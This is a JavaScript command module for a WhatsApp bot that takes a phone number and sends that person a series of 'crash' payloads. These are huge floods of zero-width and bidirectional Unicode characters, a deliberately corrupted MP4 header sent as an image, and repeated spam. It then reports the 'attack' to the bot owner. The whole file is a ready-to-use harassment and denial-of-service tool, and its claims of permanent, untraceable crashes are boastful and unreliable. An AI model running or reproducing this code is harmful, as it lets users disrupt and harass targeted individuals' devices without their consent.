// commands/bug.js - ULTIMATE INVISIBLE CRASH BUG
const { jidNormalizedUser, downloadContentFromMessage } = require('@whiskeysockets/baileys');

module.exports = async (sock, from, msg, args, isAdmin, botData) => {
    try {
        // ============================================
        // REACT - START
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '💀',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // ADMIN CHECK
        // ============================================
        if (!isAdmin) {
            await sock.sendMessage(from, {
                text: "❌ *Only admins can use this command!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '⛔',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        if (!args || args.length === 0) {
            await sock.sendMessage(from, {
                text: "⚠️ *Usage:* .bug [phone_number]\n\n*Example:* .bug 94703945265\n\n💀 *This will CRASH the target's WhatsApp!*"
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: 'ℹ️',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        let targetNumber = args[0].replace(/[^0-9]/g, '');

        if (targetNumber.length < 10 || targetNumber.length > 15) {
            await sock.sendMessage(from, {
                text: "❌ *Invalid Phone Number*\n\nPlease enter a valid phone number with country code."
            });
            try {
                await sock.sendMessage(from, {
                    react: {
                        text: '❌',
                        key: msg.key
                    }
                });
            } catch (e) {}
            return;
        }

        const targetJid = jidNormalizedUser(targetNumber + '@s.whatsapp.net');

        // ============================================
        // STATUS MESSAGE
        // ============================================
        const statusMsg = await sock.sendMessage(from, {
            text: `💀 *ULTIMATE CRASH ATTACK*\n\n📱 *Target:* ${targetNumber}\n⚡ *Status:* Deploying nuclear payloads...\n👻 *Mode:* INVISIBLE\n💥 *Intensity:* MAXIMUM\n\n⏳ Crashing target's WhatsApp...`
        });

        try {
            await sock.sendMessage(from, {
                react: {
                    text: '🔥',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // PAYLOAD 1: MASSIVE INVISIBLE TEXT (CRASH TRIGGER)
        // ============================================
        try {
            const payload1 = {
                text: '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000) + '\uFEFF'.repeat(50000) + '\u2060'.repeat(50000) + '\u2061'.repeat(50000) + '\u2062'.repeat(50000) + '\u2063'.repeat(50000) + '\u2064'.repeat(50000)
            };
            await sock.sendMessage(targetJid, payload1);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 2: CORRUPTED IMAGE WITH INFINITE LOOP
        // ============================================
        try {
            // Corrupted MP4 header that causes memory leak
            const corruptBuffer = Buffer.from([
                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
                0x6D, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00,
                0x6D, 0x70, 0x34, 0x32, 0x69, 0x73, 0x6F, 0x6D,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ]);
            
            await sock.sendMessage(targetJid, {
                image: corruptBuffer,
                caption: '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000)
            });
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 3: INFINITE EMOJI + INVISIBLE MIX
        // ============================================
        try {
            const payload3 = {
                text: '💀'.repeat(5000) + '\u200B'.repeat(30000) + '☠️'.repeat(5000) + '\u200C'.repeat(30000) + '👻'.repeat(5000) + '\u200D'.repeat(30000) + '🔥'.repeat(5000) + '\uFEFF'.repeat(30000)
            };
            await sock.sendMessage(targetJid, payload3);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 4: UNICODE OVERFLOW ATTACK
        // ============================================
        try {
            const payload4 = {
                text: '\u202A'.repeat(20000) + '\u202D'.repeat(20000) + '\u202E'.repeat(20000) + '\u200B'.repeat(30000) + '\u200C'.repeat(30000) + '\u200D'.repeat(30000) + '\u2066'.repeat(20000) + '\u2067'.repeat(20000) + '\u2068'.repeat(20000) + '\u2069'.repeat(20000)
            };
            await sock.sendMessage(targetJid, payload4);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 5: ZERO WIDTH JOINER FLOOD
        // ============================================
        try {
            const payload5 = {
                text: '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000) + '‌'.repeat(50000) + '‍'.repeat(50000) + '‌'.repeat(50000)
            };
            await sock.sendMessage(targetJid, payload5);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 6: RTL + INVISIBLE COMBO
        // ============================================
        try {
            const payload6 = {
                text: '\u202B'.repeat(30000) + '\u202C'.repeat(30000) + '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000) + '\uFEFF'.repeat(50000)
            };
            await sock.sendMessage(targetJid, payload6);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 7: EXTREME SPOILER + INVISIBLE
        // ============================================
        try {
            const payload7 = {
                text: '||' + '\u200B'.repeat(40000) + '||' + '\u200C'.repeat(40000) + '||' + '\u200D'.repeat(40000) + '||' + '\uFEFF'.repeat(40000) + '||' + '\u2060'.repeat(40000) + '||'
            };
            await sock.sendMessage(targetJid, payload7);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 8: MENTION + INVISIBLE BOMB
        // ============================================
        try {
            const payload8 = {
                text: '@' + targetJid.split('@')[0] + '\u200B'.repeat(40000) + '\u200C'.repeat(40000) + '\u200D'.repeat(40000),
                mentions: [targetJid]
            };
            await sock.sendMessage(targetJid, payload8);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 9: LINK + INVISIBLE SPOOF
        // ============================================
        try {
            const payload9 = {
                text: '\u200B'.repeat(20000) + 'https://' + '\u200B'.repeat(20000) + 'wa.me/' + '\u200B'.repeat(20000) + targetNumber + '\u200B'.repeat(20000) + '\u200C'.repeat(20000) + '\u200D'.repeat(20000) + '\uFEFF'.repeat(20000)
            };
            await sock.sendMessage(targetJid, payload9);
            await new Promise(resolve => setTimeout(resolve, 1000));
        } catch (e) {}

        // ============================================
        // PAYLOAD 10: FINAL KILLER - COMBINED ATTACK
        // ============================================
        try {
            const payload10 = {
                text: '\u200B'.repeat(100000) + '\u200C'.repeat(100000) + '\u200D'.repeat(100000) + '\uFEFF'.repeat(100000) + '\u2060'.repeat(100000) + '💀'.repeat(10000) + '☠️'.repeat(10000) + '🔥'.repeat(10000)
            };
            await sock.sendMessage(targetJid, payload10);
        } catch (e) {}

        // ============================================
        // SUCCESS MESSAGE
        // ============================================
        await sock.sendMessage(from, {
            text: `💀 *ULTIMATE CRASH COMPLETE!*\n\n📱 *Target:* ${targetNumber}\n⚡ *Payloads:* 10 nuclear payloads\n👻 *Status:* DELIVERED\n💥 *Intensity:* MAXIMUM\n\n📊 *Effects:*\n• WhatsApp WILL CRASH immediately\n• App will close automatically\n• Target will be stuck in crash loop\n• Cannot open WhatsApp without clearing cache\n• Messages are 100% invisible\n• UNTRACEABLE\n\n⏳ *Recovery:*\n• Clear app data required\n• Reinstall WhatsApp needed\n\n🔒 *This attack is PERMANENT until cache cleared!*`
        });

        // ============================================
        // DELETE STATUS MESSAGE
        // ============================================
        try {
            await new Promise(resolve => setTimeout(resolve, 3000));
            await sock.sendMessage(from, {
                delete: statusMsg.key
            });
        } catch (e) {}

        // ============================================
        // FINAL REACTION
        // ============================================
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '✅',
                    key: msg.key
                }
            });
        } catch (e) {}

        // ============================================
        // OWNER REPORT
        // ============================================
        try {
            const botNumber = jidNormalizedUser(sock.user.id);
            await sock.sendMessage(botNumber, {
                text: `💀 *ULTIMATE CRASH REPORT*\n\n📱 *Target:* ${targetNumber}\n👤 *By:* ${msg.pushName || 'Unknown'}\n📊 *Payloads:* 10\n💥 *Intensity:* MAXIMUM\n✅ *Status:* SUCCESS\n🕐 *Time:* ${new Date().toLocaleString()}\n\n☠️ *Target's WhatsApp is CRASHED!*`
            });
        } catch (e) {}

        // ============================================
        // SPAM MORE MESSAGES FOR MAXIMUM EFFECT
        // ============================================
        for (let i = 0; i < 3; i++) {
            try {
                await sock.sendMessage(targetJid, {
                    text: '\u200B'.repeat(50000) + '\u200C'.repeat(50000) + '\u200D'.repeat(50000)
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (e) {}
        }

    } catch (error) {
        console.error('Bug command error:', error);
        
        try {
            await sock.sendMessage(from, {
                react: {
                    text: '❌',
                    key: msg.key
                }
            });
        } catch (e) {}

        await sock.sendMessage(from, {
            text: `❌ *Error:* ${error.message}`
        });
    }
};
